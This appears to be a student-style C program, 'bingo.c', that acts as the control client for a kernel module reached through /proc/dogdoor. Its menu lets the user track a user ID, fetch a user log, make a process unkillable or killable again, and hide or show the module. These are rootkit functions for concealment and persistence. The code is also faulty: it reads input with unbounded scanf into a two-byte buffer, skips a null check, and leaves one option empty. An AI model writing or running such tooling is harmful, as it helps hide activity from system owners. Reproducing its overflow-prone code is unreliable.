#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<sys/types.h>  
#include <pwd.h>   

void write1(int index);
void write2(int index, int id);


int main (int argc, char *argv[]){
	char input[] = " ";
	char *argument;
	struct passwd *user_pw;

	printf("This is bingo.c\n\n");
	printf("choose the function(input number)\n");
	printf("--1. input userid\n");
	printf("--2. get user log\n");
	printf("--3. make imortal process\n");
	printf("--4. make mortal process\n");
	printf("--5. hide module\n");
	printf("--6. show module\n");
	printf("----------------------\n");
	
	while(strcmp(input, "quit")!= 0){
		printf(">");
		scanf ("%s", input);

		if(strcmp(input,"1") == 0){
			int uid=0;
			char uname[128];
			printf("input user name : ");
			scanf("%s", uname);
			user_pw=getpwnam(uname); 
			uid = user_pw->pw_uid;
			printf("uid : %d\n",uid);
			write2(1, uid);
		}else if(strcmp(input,"2") == 0){
			write1(2);
		}else if(strcmp(input,"3") == 0){
		}else if(strcmp(input,"4") == 0){
			write1(4);
		}else if(strcmp(input,"5") == 0){
			write1(5);
		}else if(strcmp(input,"6") == 0){
			write1(6);
		}else{
			printf("no such function\n");
		}

	}

 }

void write1(int index) 
{
	FILE *file_pointer;
	file_pointer=fopen("/proc/dogdoor", "w");
	fprintf(file_pointer, "%d", index);
	fclose(file_pointer);
	return;
}


void write2(int index, int id) 
{
	FILE *file_pointer;
	file_pointer=fopen("/proc/dogdoor", "w");
	fprintf(file_pointer, "%d ", index);
	fprintf(file_pointer, "%d", id);
	fclose(file_pointer);
	return;
}
